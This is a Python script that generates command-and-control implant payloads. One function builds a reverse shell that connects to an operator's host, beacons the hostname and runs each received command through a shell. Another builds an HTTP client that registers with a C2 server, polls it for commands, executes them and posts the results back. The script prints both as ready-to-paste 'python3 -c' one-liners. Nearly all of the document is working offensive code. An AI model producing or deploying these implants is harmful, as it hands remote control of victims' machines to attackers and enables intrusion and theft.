#!/usr/bin/env python3
"""
Quick C2 Client Adapter
Converts traditional reverse shell to C2 client functionality
"""

# Your original reverse shell concept adapted for C2
def reverse_shell_c2(c2_host, c2_port):
    """Traditional reverse shell with C2 enhancements"""
    payload = f"""
import socket,subprocess,os,json,threading,time,base64
def shell_handler():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("{c2_host}",{c2_port}))
        
        # Send initial beacon
        hostname = subprocess.check_output(['hostname'], text=True).strip()
        beacon = {{"type":"shell","client_id":hostname,"status":"connected"}}
        s.send(json.dumps(beacon).encode() + b"\\n")
        
        while True:
            cmd = s.recv(1024).decode().strip()
            if cmd.lower() in ['exit','quit']:
                break
            elif cmd:
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
                    s.send(output.encode())
                except Exception as e:
                    s.send(f"Error: {{str(e)}}\\n".encode())
        s.close()
    except:
        pass

shell_handler()
"""
    return payload.strip()

def http_c2_client(c2_host, c2_port=8888):
    """HTTP-based C2 client (integrates with your web interface)"""
    payload = f"""
import urllib.request,json,subprocess,time,socket,os,platform
client_id = f"{{platform.node()}}-{{os.getpid()}}"
c2_url = "http://{c2_host}:{c2_port}"

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return {{"success": True, "stdout": result.stdout, "stderr": result.stderr, "exit_code": result.returncode}}
    except Exception as e:
        return {{"success": False, "error": str(e)}}

def register():
    data = {{"client_id": client_id, "type": "shell", "hostname": platform.node(), "os": platform.system()}}
    req = urllib.request.Request(f"{{c2_url}}/api/register", json.dumps(data).encode(), {{"Content-Type": "application/json"}})
    try:
        urllib.request.urlopen(req, timeout=10)
    except:
        pass

register()
while True:
    try:
        req = urllib.request.Request(f"{{c2_url}}/api/commands/{{client_id}}")
        resp = urllib.request.urlopen(req, timeout=10)
        data = json.loads(resp.read().decode())
        
        if data.get("commands"):
            for cmd_data in data["commands"]:
                result = execute_cmd(cmd_data["command"])
                result_req = urllib.request.Request(
                    f"{{c2_url}}/api/results",
                    json.dumps({{"client_id": client_id, "command_id": cmd_data["id"], "result": result}}).encode(),
                    {{"Content-Type": "application/json"}}
                )
                urllib.request.urlopen(result_req)
    except:
        pass
    time.sleep(5)
"""
    return payload.strip()

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python3 adapter.py <TYPE> <C2_HOST> [C2_PORT]")
        print("Types: shell, http")
        print("Examples:")
        print("  python3 adapter.py shell 192.168.210.170 1337")
        print("  python3 adapter.py http 192.168.210.170 8888")
        sys.exit(1)
    
    payload_type = sys.argv[1]
    c2_host = sys.argv[2] 
    c2_port = int(sys.argv[3]) if len(sys.argv) > 3 else (1337 if payload_type == "shell" else 8888)
    
    if payload_type == "shell":
        print("# Traditional Reverse Shell (Direct Socket)")
        print(f'python3 -c "{reverse_shell_c2(c2_host, c2_port)}"')
    elif payload_type == "http":
        print("# HTTP C2 Client (Web Interface Compatible)")  
        print(f'python3 -c "{http_c2_client(c2_host, c2_port)}"')